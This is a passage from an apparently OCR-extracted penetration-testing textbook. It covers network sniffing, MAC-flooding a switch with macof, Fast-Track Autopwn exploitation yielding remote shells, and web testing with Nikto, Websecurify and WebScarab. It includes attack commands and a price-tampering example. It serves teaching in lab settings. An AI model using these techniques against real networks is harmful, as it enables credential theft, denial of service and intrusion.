in use today still send sensitive and important information over the network without encryption. n etwork traffic sent without using encryption is often referred to as clear text because it is human readable and requires no deciphering. s niffing clear text network traffic is a trivial but effective means of gaining access to systems. Before we begin sniffing traffic, it is important that you understand some basic network information. t he difference between promiscuous mode and nonpro- miscuous network modes will be discussed first. By default most network cards operate in nonpromiscuous mode. n on- promiscuous mode means that the network interface card ( nic) will only pass on the specific traffic that is addressed to it. i f the nic receives traffic that matches its address, the nic will pass the traffic onto the c PU for processing. f IGURE 4.13 Chntpw User Edit Menu."},{"pageNumber":112,"pageContent":"Exploitation ChApTER 4 93 if the nic receives traffic that does not match its address, the nic simply dis- cards the packets. i n many ways, a nic in nonpromiscuous mode acts like a ticket taker at a movie theater. t he ticket taker stops people from entering the theater unless they have a ticket for the specific show. Promiscuous mode on the other hand is used to force the nic to accept all packets that arrive. i n promiscuous mode, all network traffic is passed onto the c PU for processing regardless of whether it was destined for the system or not. i n order to successfully sniff network traffic that is not normally destined for your P c, you must make sure your network card is in promiscuous mode. You may be wondering how it is possible that network traffic would arrive at a computer or device if the traffic was not addressed to the device. t here are several possible scenarios where this situation may arise. f irst any traffic that is broadcast on the network will be sent to all connected devices. Another exam- ple is networks that use hubs rather than switches to route traffic. A hub works by simply sending all the traffic it receives to all the devices con- nected to its physical ports. in networks that use a hub, your n ic is constantly disregarding packets that do not belong to it. fo r example, assume we have a small 8-port hub with 8 computers plugged into the hub. in this environment when the P c plugged into port number 1 wants to send a message to the P c plugged into port number 7, the message (network traffic) is actually delivered to all the computers plugged into the hub. However, assuming all the computers are in nonpromiscuous mode, machines 2–6 and 8 simply disregard the traffic. ma ny people believe you can fix this situation by simply swapping your hubs with switches. th is is because unlike hubs that broadcast all traffic to all ports, switches are much more discrete. wh en you first plug a computer into a switch, the mAc address of the computer’s n ic is registered with the switch. th is information (the computer’s mAc address and switch’s port number) is then used by the switch to intelligently route traffic for a specific machine to the spe- cific port. go ing back to your previous example, if a switch is being used and P c 1 sends a message to P c 7, the switch processes the network traffic and con- sults the table containing the mAc address and port number. it then sends the message to only the computer connected to port number 7. de vices 2–6 and 8 never receive the traffic. MACO f: MAKING ChICKEN SALAD OUT Of C hICKEN Sh* T it should be pointed out that the discrete routing property of a switch was orig- inally designed to increase performance, not to increase security. As a result of this, any increase in security should be viewed as a by-product of the design rather than its original goal. ke eping this in mind, before you run out to replace all your hubs with switches, you should be aware that there are tools available that can be used against a switch to make it act like a hub. in other"},{"pageNumber":113,"pageContent":"The Basics of h acking and p enetration Testing 94 words, in some instances, we can cause a switch to broadcast all traffic to all ports making it behave exactly like a hub. m ost switches have a limited amount of memory that can be used to remem- ber the table containing m A c address and corresponding port numbers. By exhausting this memory and flooding the table with bogus m A c addresses, a switch will often become incapable of reading or accessing valid entries in the m A c to port table. Because the switch cannot determine the correct port for a given address, the switch will simply broadcast the traffic to all ports. t his model is known as “fail open.” t he concept of fail open simply means that when the switch fails to properly and discretely route traffic, it falls back to a hub-like state (open) that sends all traffic to all ports. You should be aware that some switches are configured to “fail closed.” s witches that fail closed operate in exactly the opposite manner of a fail open switch. r ather than broadcasting all traffic to all ports, fail closed switches sim- ply stop routing traffic altogether. However, as a penetration tester or hacker, there is an upside to this configuration as well. i f you are able to prevent the switch from routing traffic, you have stopped all traffic on the network and caused a d enial of s ervice . d sn iff is an excellent collection of tools that provide many useful functions for sniffing network traffic. i t is recommended that you take time and review each of the tools and documentation included with dsniff. o ne of the dsniff tools written by d ug s on g, called macof, provides us with the ability to flood a switch with thousands of random m A c a ddresses. i f the switch is configured to fail open, the switch will begin to act like a hub and broadcast all traffic to all ports. t hi s will allow you to overcome the selective routing of a switch and sniff all network traffic passing through the device. m ac of is built into Backtrack and can be run by issuing the following command in a terminal window: macof –i eth0 –s 172.16.45.123 –d 172.16.45.2 i n the preceding example, “macof” is used to invoke the program. t he macof program will generate and flood the network with thousands of m A c addresses . t he “-i” switch is used to specify your computer’s network card. t his is where the m A c addresses will be sent from. t he “-s” is used to specify the source address. t he “-d” is used to specify the destination or target of your attack. f igure 4.14 shows an example of the command used to start macof, and a selection of the generated output. As a final word of caution, using macof will generate tremendous amounts of network traffic and is therefore easily detectable. You should use this technique only when stealth is not a concern. w ith the concepts of promiscuous mode and the ability to sniff traffic on a switch in mind, you can examine another popular tool that can be used to view and capture network traffic. o ne of the simplest and most powerful tools for sniffing network traffic is w ireshark. w ireshark was originally written by D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":114,"pageContent":"Exploitation ChApTER 4 95 gerald c ombs in 1998. t his popular tool is a free network protocol analyzer that allows you to quickly and easily view and capture network traffic. You can download w ireshark for free from http://www.wireshark.org. w ireshark is an extremely flexible and mature tool. i t should be noted that prior to 2006 w ireshark was known as e thereal. e ven though the program remained the same, the name was changed due to some trademark issues. w ireshark is built into Backtrack and can be accessed through the k- menu dragon by selecting: k- menu → Backtrack → Privilege e scalation → s niffers → w ireshark as shown in figure 4.15. remember that by default Backtrack does not turn enable or start any of your network interfaces. Be sure that you have enabled and configured at least one network interface in Backtrack before running w ireshark. t he instructions for doing this can be found in chapter 1. w hen you first start w ireshark inside of Backtrack, you will get a message tell- ing you that “ r unning w ireshark as user ‘root’ can be dangerous.” You can f IGURE 4.14 Using Macof to Flood a Switch. f IGURE 4.15 Starting Wireshark through the K-Start Menu."},{"pageNumber":115,"pageContent":"The Basics of hacking and penetration T esting 96 click “ ok” to acknowledge this warning. w hen you first start w ireshark you will need to select your network card and ensure that it is properly set up to capture all available traffic. You can do this by clicking on the icon showing a network card and a menu list. t he icon is located in the upper left corner of the program. figure 4.16 shows a screenshot of the button. s electing the “ list available capture interfaces ... ” button will bring up a new window displaying all the available interfaces. f rom here you will be able to view and select the appropriate interface. You can begin a simple capture by accepting the defaults and clicking on the “ start” button associated with the desired nic or you can customize your capture options by clicking on the “options” button. f igure 4.17 shows an example of the w ireshark c apture i nterfaces window. Because we are focusing on the basics, we will leave the default options and select the “ start” button. t he w ireshark capture window should fill rapidly and continue to stream packets as long as you let the capture run. d o not worry about attempting to view this information on the fly. w ireshark allows us to save the capture results and review them later. to facilitate this example, you should start an ft P server on one of the machines attached to the network. n ow that w ireshark is up and running, that is, capturing network traffic in promiscuous mode, it is possible to log into the ft P server as the user “ownedb.” After letting the w ireshark capture run for several minutes, stop the capture by clicking on the button with a n etwork card; a red “x.” t his button is located in the menu at the top of the w ireshark capture window as shown in figure 4.18. f IGURE 4.16 Wireshark Button to Select the Capture Interface. f IGURE 4.17 Wireshark Capture Interfaces Window."},{"pageNumber":116,"pageContent":"Exploitation ChApTER 4 97 once the network capture has been stopped, you are free to review the pack- ets captured by w ireshark. You should take some time to review your capture and attempt to identify any relevant information. As shown in f igure 4.19, our packet dump was able to successfully capture the username, password, and i P address of the ft P server! we could now use this information to log into the ft P server. i f you performed a capture on a particularly busy network, you may find the volume and sheer number of captured packets overwhelming. m anually reviewing a large packet capture may not be feasible. l uckily w ireshark includes a filter that can be used to drill down and refine the displayed output. revisiting our previous example, we could enter the keyword “ftp” in the f ilter box and click the “Apply” button. t his will cause w ireshark to remove all pack- ets that do not belong to the ft P protocol from our current view. o bviously, this will significantly reduce the number of packets we need to review. w ireshark includes some incredibly powerful filters. i t is well worth the effort to take the time to review and master w ireshark filters. i t should be pointed out that you can always remove your current filtered view and go back to the original packet capture by clicking the “ clear” button. fAST -T RACK AUTO pWN : BREAKING OUT ThE M-60 An earlier section described the use of m etasploit as a sniper rifle for taking down vulnerable and unpatched systems. Another tool called fast- track is built on m etasploit; but rather than requiring the penetration tester to dig for vulnerabilities and match exploits, fast- track simply automates the entire pro- cess. w hen using fast- t rack, the only thing a penetration tester needs to do is to enter the target’s iP address. f IGURE 4.18 Stopping the Wireshark Capture. f IGURE 4.19 Using Wireshark to Sniff FTP Credentials."},{"pageNumber":117,"pageContent":"The Basics of hacking and penetration T esting 98 there is nothing subtle or stealthy about fast- track. t he tool works by con- ducting a port scan of the target; based on the information returned from the port scan, fast- track sprays every known or possible matching exploit against the target. fast- track takes the “let’s throw everything at the wall and see what sticks” approach to exploitation. e ven if fast- track is successful in getting a shell, the tool continues spraying attacks against the target until all the possible exploits have been attempted. w hen used against weak targets, this will often lead to multiple shells. t he easiest way to start fast- t rack is to click on the k- start dragon → Backtrack → Penetration → f ast t rack → f ast- t rack w eb gUi as shown in figure 4.20. o nce started, fast- t rack will open a terminal window and run a series of com- mands. After a brief pause, f irefox will automatically open to the fast- t rack w eb page. f rom the main fast- t rack page, you can click on the Autopwn Automation link as shown in figure 4.21. After selecting the Autopwn Automation link, you can scroll the web page down and find the “ enter i P Address or range:” textbox. e nter your target i P into the text box provided and choose if you want a bind or reverse shell on the target. o nce you have set these options, you can click the “ metasploit Autopwn” link at the bottom of the page as shown in figure 4.22. c licking the m etasploit Autopwn link will cause fast- t rack to unleash a flood of exploits against your target. t he system will open a terminal window and begin issuing commands automatically. t his process may take several min- utes to complete. You can watch the progress of the program as it scrolls by in the terminal window. You will also be able to see an accurate count of the number of remote shells that were automatically established. w hen fast- t rack has exhausted its supply of potential exploits, you can view any and all of the f IGURE 4.20 Starting the Fast-Track WebGUI."},{"pageNumber":118,"pageContent":"Exploitation ChApTER 4 99 f IGURE 4.21 Selecting Autopwn Automation from the Fast-Track WebGUI. f IGURE 4.22 Fast-Track Autopwn Options."},{"pageNumber":119,"pageContent":"The Basics of hacking and penetration T esting 100 shells that were obtained by issuing the following command within the fast- track terminal windo w: sessions –l if fast- track was successful in creating remote access to the target machine, this command (please note that is a dash lower case “ l”) will list each shell that was opened. to use a shell, you can issue the following in the fast- track termi- nal window: sessions –i shell_id in this command the shell_id is replaced with the session number as listed from the “sessions –l” command. running this command will drop you into a shell on the remote machine. f igure 4.23 shows an example of both of these commands. At this point you have a m eterpreter shell on the target machine. f igure 4.24 demonstrates using the m eterpreter “ls” command to list the contents of the current directory and provides proof that our shell is interacting with the target. o bviously at this point the exploitation phase is over for this target! hOW DO I p RACTICE ThIS STE p? Practicing exploitation is one of the most challenging, frustrating, time-con- suming and rewarding experiences that can be offered to new hackers and penetration testers. i t is probably a fair assumption that if you are reading this book you are interested in hacking. As mentioned earlier, the process of exploitation is the single step most often associated with hacking (even though you now know it is much more!). i f you have never successfully “owned” or exploited a target, you are in for quite a treat. t he experience of gaining f IGURE 4.23 Listing and Using Shells Generated from Fast-Track."},{"pageNumber":120,"pageContent":"Exploitation ChApTER 4 101 administrative access on another machine is a thrill that is both electrifying and unique. t here are several ways to practice this step; the easiest way is to set up a vulner- able target in your penetration-testing lab. o nce again, using virtual machines is helpful because exploitation can be a very destructive process and resetting a virtual machine is often easier and faster than reimaging a ph ysical machine. if you are new to exploitation, it is important that you have a few immedi- ate successes. th is will keep you from getting discouraged as you progress and move onto more difficult targets where the exploitation process becomes more tedious and difficult. As a result it is suggested that you start learning exploi- tation by attacking old, unpatched versions of operating systems and software. su ccessfully exploiting these systems should give you motivation to learn more. th ere are many examples of students becoming quickly and permanently dis- illusioned with exploitation and hacking because they attempted to attack the latest-greatest-fully-patched operating system and fell flat on their face. re member this book focuses on the basics. on ce you master the tools and tech- niques discussed here, you will be able to move onto the more advanced topics. if you are new to this process, let yourself win a little and enjoy the experience. i f possible, you should try to obtain a legal copy of m icrosoft’s x P to add to your pen testing lab environment. You should be able to find a legal copy on f IGURE 4.24 Fast-Track Proof of Concept."},{"pageNumber":121,"pageContent":"The Basics of hacking and penetration T esting 102 eBay, Amazon, or c raigslist. Just make sure you are purchasing a genuine copy so that you can stay on the right side of the e UlA. i t is always suggested that newcomers begin with x P because there are still abundant copies available and there are standing exploits in the m etasploit f ramework that will allow you to practice your metasploit-fu. w hen building your pen testing lab, it is recommended that you find the low- est s ervice Pack edition of x P as each service pack level patches a number of holes and vulnerabilities. w ith this advice in mind, x P with no service pack installed is best. x P s P 1 would be next best; x P s P 2 and x P s P 3 are the least desirable. t his is because m icrosoft introduced some significant security changes to x P beginning with s ervice Pack 2. However, even x P s P 3 has at least 1 standing exploit and can still make an excellent vulnerable target. ol d versions of li nux are also a great source of “exploitable targets.” th e crew from Backtrack created a free me tasploit training module called “ me tasploit Unleashed.” it is strongly recommended that you explore this resource after completing this book. th e me tasploit Unleashed project contains a detailed description of how to download and set up Ubuntu 7.04 with sAmB A installed. cr eating a virtual machine with Ubuntu 7.04 and sAmB A running is a way of setting up a free (as in no cost) vulnerable target and allows you practice attack- ing a li nux system. me tasploit itself has also released a vulnerable target that can be used to practice exploitation. th e target system is a li nux virtual machine called “ me tasploitable.” me tasploitable is based on Ubuntu 8.04 and is available at no charge. You can download your copy of me tasploitable by grabbing the torrent on the me tasploit ex press co mmunity site. th e virtual machine is configured to run as a live distribution, so if you destroy the system beyond repair, you simply have to reboot it to start over from scratch. th is is a great way to practice. fi nally, th omas wi lhelm has graciously created and offered for free a series of entertaining, challenging, and highly customizable live li nux c d s called de - i ce . th e de - i ce c d s allow you to practice a series of penetration test- ing challenges following a realistic scenario. You can get your hands on these great c d s by downloading them at http://heorot.net/livecds/. th e c d s are great because they present you with a realistic simulation of an actual penetration test. Another great feature of the d e-ice cd s is that you would not be able to sim- ple Autopwn your way through the challenges. e ach d e-ice cd includes sev- eral different levels of challenges that you must complete. As you work your way through the challenges, you will need to learn to think critically and use many of the tools and techniques we have discussed in steps 1–3. t he only word of caution when using these awesome cd s (or any preconfig- ured lab for that matter) is that you should be very careful about asking for too much help, giving up too soon, and relying on the hints too often. l ive cd s like d e-ice hold a tremendous value but oftentimes you only get to work through them a single time. o nce you have read the hint or solution to"},{"pageNumber":122,"pageContent":"Exploitation ChApTER 4 103 a problem, there is no way to put the “answer Jinni” back into the bottle, as you will most likely remember the answer forever. As a result, you are encour- aged to have persistence and tough it out. i f you have read and practiced every- thing that has been discussed up to this point, you will have the ability to gain administrative access to the first de-ice disk. o f course, you can always go back and rerun the challenges and you are encouraged to do so, but it will be different the second time around because you will know what to look for. take your time, enjoy the challenge, and work through the issues you encounter. Believe it or not, there is tremendous value and learning potential in banging your head against a seemingly insurmount- able problem. i f you want to be a penetration tester, you will need to learn to be persistent and resourceful. e mbrace the challenges you encounter as a learn- ing situation and make the most of them. s etting up and working your way through all the vulnerable targets described above should be an enjoyable process. Below you will find some specific tips for setting up targets to practice each of the tools that were discussed in this chapter. t he easiest way to practice m edusa is to start a remote process on a target machine. try starting telnet on a w indows machine and ss H or ft P on a l inux machine. You will need to create a few additional users and passwords with access to the remote services. o nce you have the remote service running, you can practice using medusa to gain access to the remote system. t he easiest way to practice m etasploit and fast- t rack is by setting up an older version of w indows x P as the target; remember the lower the service pack, the better. You can also download a copy of Ubuntu 7.04 and install s AmBA on it or find metasploit’s own “ metasploitable” virtual machine. to practice with John the r ipper and chntpw, you can set up a victim machine with several user accounts and different passwords. i t is highly suggested that you vary the strength of the passwords for each account. m ake a few user accounts with weak three- and four-letter passwords and make others with longer passwords that include upper and lowercase letters along with special characters. Wh ERE DO I GO fROM hERE ? At this point you should have a solid understanding of the basic steps required to exploit and gain access to a system. remember your attack methods will change based on your target and desired goal. n ow that you understand the basics, you should be ready to tackle some more advanced topics. You should take some time and review the password brute forcing tool Hydra. t his tool functions much like m edusa but provides a few extra switches to give you some additional options. c arefully review each of the switches supported by Hydra. You can find the switches and a brief description by reviewing the"},{"pageNumber":123,"pageContent":"The Basics of hacking and penetration T esting 104 Hydra man pages. i t is recommended that you pay special attention to the tim- ing option. t he ability to control the timing or rate of connections is handy for correcting many connection errors that occur when we utilize online password crackers. Along with your own personal password dictionary, you should begin build- ing a list of default usernames and passwords for various network devices. As you progress in your penetration testing career, you will probably be surprised at how often you will come across devices like routers, switches, modems, fire- walls, etc., that still use a default username and password. i t is not uncommon to find P t stories where the penetration tester was able to take complete con- trol of a boarder router and redirect all internal and external traffic because the company administrator had forgotten to change the default username and password. i t does little good to spend time configuring and securing your device if you fail to change the username and password. t here are several good starter lists of default usernames and passwords available online. Another great tool for password cracking is rainbo wcrack. rainbo wcrack is a tool that relies on rainbo w tables to crack passwords. A rainbo w table is a precomputed list of password hashes. recall that traditional password-cracking tools like John the r ipper go through a three-step process. f irst, the tool must generate a potential password; next, the tool needs to create a hash of the cho- sen word; and finally, the password-cracking tool has to compare the generated hash with the password hash. rainbo w tables are much more efficient because they make use of precomputed password hashes. t his means that the cracking process reduces two out of the three steps and simply needs to compare hashes to hashes. th ere are lots of great tools that can be explored and used for sniffing. it is highly recommended that you spend time getting to know and use wi reshark. th is book covered only the basics, but wi reshark is a deep program with many rich features. You should learn how to use the filters, follow data streams, and view information on specific packets. on ce you are comfortable with wi reshark, digging into dsniff is highly recommended. As mentioned earlier, dsniff is an incredible suite with tons of great tools. wi th some self-study and practice, you can even learn to intercept encrypted traffic like s sl . e ttercap is another fantastic tool that has many powerful features and abili- ties. e ttercap is a great tool for conducting man-in-the-middle attacks. e ttercap works by tricking clients into sending network traffic through the attacker machine. t his is a great way to get usernames and passwords from machines on the local l An. o nce you have successfully studied and used w ireshark, dsniff, and e ttercap, you will be well on your way to mastering the basics of network sniffing. After reviewing and understanding the basics of m etasploit, you should dig in and learn the details of the m eterpreter payload. t here are dozens of switches, commands, and ways to interact with the m eterpreter. You should learn and"},{"pageNumber":124,"pageContent":"Exploitation C h A p TER 4 105 practice them all. l earning how to control this amazing payload will pay mountains of dividends in your exploitation career. i t is important that you understand using m etasploit in combination with the m eterpreter is one of the most lethal amalgamations available to a new penetration tester. d o not underestimate or overlook this powerful tool. Until now only automated attacks have been discussed. e v en though it can be extremely entertaining to push buttons and pwn remote systems, if you never advance your skill level beyond this point, you will be a script kiddie forever. i nitially we all start out as a person who must rely on others to develop and release new exploit tools, but to become truly elite you will need to learn how to read, write, and create your own exploits. w hile creating your own exploits may seem daunting at first, it is a process that becomes much easier the more you learn. A good place to start learning about exploitation is by getting to know buffer overflows. s tack and heap based buffer overflows, which are responsible for many of the exploits available today, often seem like magic or voodoo to newcom- ers. However, with some dedicated and careful self-study, these topics can be demystified and even mastered. Advancing your skill level to the point of being able to find buffer overflows and write shell code often requires some additional training. Although this train- ing is not strictly required, it certainly makes the process of learning advanced exploitation much easier. w he never possible, you should spend time learning a programming language like “ c .” o nc e you are comfortable with c , you should focus on understanding at least the basics of Assembly l an guage. Having a solid understanding of these topics will help dispel much of the “black-magic” feel many people have when they first encounter buffer overflows. S UMMAR y t his chapter focused on step 3 of our basic methodology: exploitation. e xp loitation is the process most newcomers associate directly with “hacking.” Because exploitation is a broad topic, the chapter examined several different methods for completing this step including using the online password cracker m ed usa to gain access to remote systems. t he process of exploiting remote vul- nerabilities with m et aploit was discussed as well as several payloads that can be used with m et asploit. John the r ip per was introduced for cracking local pass- words. A tool for password resetting was shown for those times when a penetra- tion tester does not have time to wait for a password cracker. w ir eshark was used to sniff data off the network and macof was used to sniff network traffic on a switched network. f in ally, f as t- t ra ck Autopwn was shown as a one-stop shop for the exploitation phase. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":125,"pageContent":"This page intentionally left blank"},{"pageNumber":126,"pageContent":"107 Web-Based Exploitation ChApTER 5 Information in This Chapter: n Inter rogating Web Servers: Nikto n W ebsecurify: Automated Web Vulnerability Scanning n Spidering: Cra wling Your Target’s Website n Intercepting Requests with W ebScarab n Code Injection Attacks n Cross-Site Scripting: Browser s That Trust Sites"},{"pageNumber":127,"pageContent":"The Basics of hacking and penetration T esting 108 INTRODUCTION now that you have a good understanding of common network-based attacks, it is important to take some time to discuss the basics of web-based exploitation. t he web is certainly one of the most common attack vectors available today because everything is connected to the i nternet. n early every company today has a web presence, and more often than not, that web presence is dynamic and user-driven. Previous-generation websites were simple static pages coded mostly in H tml. By contrast, many of today’s websites include complex cod- ing with backend database-driven transactions and multiple layers of authen- tication. Home computers, phones, appliances, and of course systems that belong to our targets are all connected to the internet. As our dependence and reliance on the web continues to expand, so does the need to understand how this attack vector can be exploited. A few years back, people started using words like “ web 2.0” and “cloud-based computing” to describe a shift in the way we interact with our systems and pro- grams. s imply put, these terms are a change in the way computer programs are designed, run, accessed, and stored. regardless of what words are used to describe it, the truth of the matter is that the i nternet is becoming more and more “executable.” i t used to be that programs like m icrosoft o ffice had to be installed locally on your physical computer. n ow this same functionality can be accessed online in the form of g oogle d ocs and many other cloud com- puting services. i n many instances, there is no local installation and your data, your programs, and your information reside on the server in some physically distant location. As mentioned earlier, companies are also leveraging the power of an executable web. o nline banking, shopping, and record-keeping are now common place. e verything is interconnected. i n many ways, the i nternet is like the new “wild west.” Just when it seemed like we were making true progress and fundamen- tal changes to the way we program and architect system software, along comes the i nternet and gives us a new way to relearn and repeat many of the security lessons from the past. As people rush to push everything to the web and sys- tems are mashed up and deployed with worldwide accessibility, new attacks are developed and distributed at a furious pace. i t is important that every aspiring hacker and penetration tester understand at least the basics of the web-based exploitation. INTERROGATING WEB SER v ERS : N IKTO After running a port scan and discovering a service running on port 80 or port 443, one of the first tools that should be used to evaluate the service is n ikto. n ikto is a web server vulnerability scanner. t his tool was written by c hris s ullo and d avid l odge. n ikto automates the process of scanning web servers"},{"pageNumber":128,"pageContent":"Web-Based Exploitation ChApTER 5 109 for out-of-date and unpatched software as well as searching for dangerous files that may reside on web servers. n ikto is capable of identifying a wide range of specific issues and also checks the server for configuration issues. t he current version of n ikto is built into Backtrack and available in the /pentest/scanners/ nikto directory. i f you are not using Backtrack, n ikto can be obtained by down- loading it from the http://www.cirt.net/ nikto2 website. Please note you will need Perl installed to run nikto. to view the various options available, you can run the following command from inside the /pentest/scanners/nikto directory: perl nikto.pl running this command will provide you with a brief description of the switches available to you. to run a basic vulnerability scan against a target, you need to specify a host i P address with the “-h” switch. You should also specify a port number with the “-p” switch. You can instruct n ikto to scan multiple ports by specifying a port range. for example to scan for web servers on all ports between 1 and 1000, you would issue the following command in a termi- nal window (again you must be in the /pentest/scanners/nikto directory): perl nikto.pl -h 172.16.45.129 –p 1-1000 if you fail to specify a port number, n ikto will only scan port 80 on your tar- get. i f you want to save the n ikto output for later review, you can do so by issuing the “–o” followed by the file path and name of the file you would like to use to save the output. f igure 5.1 includes a screenshot of the n ikto output from our example. f IGURE 5.1 Output of the Nikto Web Vulnerability Scanner."},{"pageNumber":129,"pageContent":"The Basics of hacking and penetration T esting 110 WEBSECURI fy: AUTOMATED WEB v ULNERABILIT y SCANNING Another great tool to use when first interacting with a target web server is websecurify . websecurify provides an easy-to-use interface that allows pen- etration testers to quickly and easily identify web vulnerabilities including s Ql injection, cross-site scripting, file includes, cross-site request forgery, and others. websecurify can be set up and used with little configuration making it very handy for people who are new to web penetration testing. You can access websecurify by clicking: k- start dragon → Backtrack → web Application Analysis → web (front end) → web securify. After starting the program you will be presented with a “ getting s tarted” page; you can begin your test by clicking on the “ start new automated test” link as shown in figure 5.2. After clicking the “ start new automated test,” you will be presented with a s tart test window. You will need to enter a U rl or i P address in the “ target” textbox. e ntering information in the “ workspace” textbox is optional, as websecurify will automatically generate this for you when you enter a target. f igure 5.3 shows the s tart test window; once you have entered a U rl or i P address, you can click the “ ok” button to begin your test. o nce the test is completed, you will be presented with a workspace report that will allow you to view specific details and issues that were discovered by websecurify . You can view the specific information by clicking the triangle to expand the findings. figure 5.4 shows the output from our scan. f IGURE 5.2 Starting an Automated Web Test Using Websecurify."},{"pageNumber":130,"pageContent":"Web-Based Exploitation ChApTER 5 111 As you can see, websecurify found several issues including an s Ql injection vulnerability. s Ql injection attacks will be discussed in a later section of this chapter. Sp IDERING : CRAWLING yOUR TARGET ’S WEBSITE Another great tool to use when initially interacting with a web target is web scarab. web scarab was written by rogan d awes and is available through the o w A sP website. i f you are running Backtrack, a version of web scarab is already installed. t his powerful framework is modular in nature and allows f IGURE 5.3 Entering a Target in the Websecurify Start Test Window. f IGURE 5.4 Websecurify Report."},{"pageNumber":131,"pageContent":"The Basics of hacking and penetration T esting 112 you to load numerous plug-ins to customize it to your needs. e ven in its default configuration, web scarab provides an excellent resource for interacting with and interrogating web targets. After having run the vulnerability scanners, n ikto and websecurify , the next logical step is to run a spidering program on the target website. s piders are extremely useful in reviewing and reading (or crawling) your target’s website looking for all links and associated files. e ach of the links, web pages, and files discovered on your target are recorded and cataloged. t his cataloged data can be useful for accessing restricted pages and locating unintentionally disclosed documents or information. You can access the spider function in web scarab by first starting the program through the k- start dragon. t his can be accomplished by clicking: k- start dragon → Backtrack → web Application Analysis → web (front end) → webscarab lite . t his will load the web scarab program. However, before you can begin spider- ing your target, you will need to switch to the “full-featured interface.” You can do this by clicking on the “ t ools” menu and putting a checkbox in the “Use full-featured interface” checkbox as shown in figure 5.5. After switching to the full-featured interface, you will be prompted to restart web scarab. o nce you restart the tool, you will be given access to a number of new panels along the top of the window including the “ spider” tab. n ow that you have set up web scarab, you need to configure your browser to use a proxy. s etting up web scarab as your proxy will cause all the web traf- fic going into and coming out of your browser to pass through the web scarab program. i n this respect, the proxy program acts as a middle man and has the ability to view, stop, and even manipulate network traffic. s etting up your browser to use a proxy is usually done through the prefer- ences or network options. i n f irefox, you can click on: e dit → Preference. i n the f irefox Preferences window, click the “Advanced” menu followed by the “network” tab. finally, click on the “ settings” button as shown in figure 5.6. cl icking on the settings button will allow you to configure your browser to use we b sc arab as a proxy. se lect the radio button for “ ma nual proxy configura- tion:”. ne xt enter: 127.0.0.1 in the “H t t P Proxy:” input box. fi nally enter: 8008 f IGURE 5.5 Switching WebScarab to Run in Full-featured Interface Mode."},{"pageNumber":132,"pageContent":"Web-Based Exploitation ChApTER 5 113 into the “Port” field. it is usually a good idea to check the box just below the “H t tP Proxy” box and select “Use this proxy server for all protocols.” on ce you have all of this information entered, you can click “ o k” to exit the co nnection se ttings window and “ cl ose” to exit the fi refox Preferences window. fi gure 5.7 shows an example of my fi refox co nnection se ttings window. At this point, any web traffic coming into or passing out of your browser will route through the web scarab proxy. tw o words of warning: f irst you need to f IGURE 5.6 Setting Up Firefox to Use WebScarab as a Proxy. f IGURE 5.7 Firefox Connection Settings for Using WebScarab as a Proxy."},{"pageNumber":133,"pageContent":"The Basics of hacking and penetration T esting 114 leave web scarab running while it is serving as a proxy. i f you close the pro- gram, you will not be able to browse the i nternet. i f this happens, f irefox is great at providing you with an error message that it cannot find a proxy and you will need to restart web scarab or change your network configura- tion in f irefox. t he second warning is that while surfing the i nternet using a local proxy, all https traffic will show up as having an invalid certificate! t his is expected behavior because your proxy is sitting in the middle of your connection. As a side note, it is important that you always pay attention to invalid security certificates when browsing. At this point, certificates are your best defense and often your only warning against a man-in-the-middle attack. no w that you have set up a proxy and have configured your browser, you are ready to begin spidering your target. You begin by entering the target U r l into the browser. in our earlier example, we discovered a website running on 172.16.45.132. en tering the following into your fi refox browser will load the website through we b sc arab. on ce the website has loaded in your browser, you can switch over the we b sc arab program. You should see the U r l you entered (along with any others that you have visited since starting your proxy). to spider the site, you right click the U r l and choose “ sp ider tree” as shown in fi gure 5.8. You can now view each of the files and folders associated with your target web- site. i ndividual folders can be further spidered by right clicking and choosing “spider tree” again. You should spend time carefully examining every nook and cranny within your authorized scope. s pidering a website is a great way to find inadvertently or leaked confidential data from a target website. f IGURE 5.8 Using WebScarab to Spider the Target Website."},{"pageNumber":134,"pageContent":"Web-Based Exploitation C h A p TER 5 115 I NTERCE p TING RE q UESTS WIT h WEBSCARAB As previously mentioned, w eb s carab is a very powerful tool. o ne of its many roles is to function as a proxy server. r ecall that a proxy sits between the cli- ent (browser) and the server. w hile the proxy is running, all the web traffic flowing into and out of your browser is passed through the program. Passing traffic through a local proxy provides us with an amazing ability; by running w eb s carab in this mode, we are able to stop, intercept, and even change the data either before it arrives or after it leaves the browser. t his is a subtle but important point; the use of a proxy allows us to make changes to data in tran- sit. t he ability to manipulate or view H tt P request or response information has serious security implications. c onsider the following: some poorly coded websites rely on the use of hidden fields to transmit information to and from the client. i n these instances, the programmer makes use of a hidden field on the form, assuming that the user will not be able to access it. Although this assumption is true for a normal user, anyone leveraging the power of a proxy server will have the ability to access and modify the hidden field. t he classic example of this scenario is the user who was shopping at an online golf store. After browsing the selection, he decided to buy a driver for $299. Being a security analyst, the astute shopper was running a proxy and noticed that the website was using a hidden field to pass the value of the driver ($299) to the server when the “add to cart” button was clicked. t he shopper set up his proxy to intercept the H tt P P ost request. t his means when the information was sent to the server, it was stopped at the proxy. t he shopper now had the ability to change the value of the hidden field. After manually changing the value from $299 to $1, the request was sent onto the server. t he driver was added to his shopping cart and the new total due was $1. Although this scenario is not as common as it used to be, it certainly demon- strates the power of using a proxy to intercept and inspect H tt P requests and responses. t o use w eb s carab as an interceptor, you need to configure your browser to use a proxy as discussed in the s pidering section of this chapter. o nce your browser is configured to use the proxy, you can start w eb s carab by clicking on the following: k - s tart dragon → Backtrack → w eb Application Analysis → w eb (front end) → w eb s carab lite . You will need to restart w eb s carab to use the “lite” version. o nce w eb s carab has finished loading, you will need to click on the “ i ntercepts tab.” n ext y ou should put a check box in both the “ i ntercept requests” and “ i ntercept responses” as sho wn in f igure 5.9. A t this point you can use f irefox to bro wse through your target website. D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":135,"pageContent":"The Basics of hacking and penetration T esting 116 with web scarab set up as described, the proxy will stop nearly every transac- tion and allow you to inspect or change the data. l uckily if you find yourself in this situation, web scarab has included a “ cancel A ll i ntercepts” button. t his can be handy to keep moving forward. to change the values of a given field, wait for web scarab to intercept the request; then locate the variable you wish to change. At this point, you can simply enter a new value in the “value” field and click the “ insert” button to update the field with the new value. Viewing H ttP response and requests can also be useful for discovering user- name and password information. Just remember, the value in many of these fields will be Base64 encoded. Although these values may look as though they are encrypted, you should understand that Base64 is a form of encoding not encryption. Although these processes may sound similar, they are vastly differ- ent. d ecoding 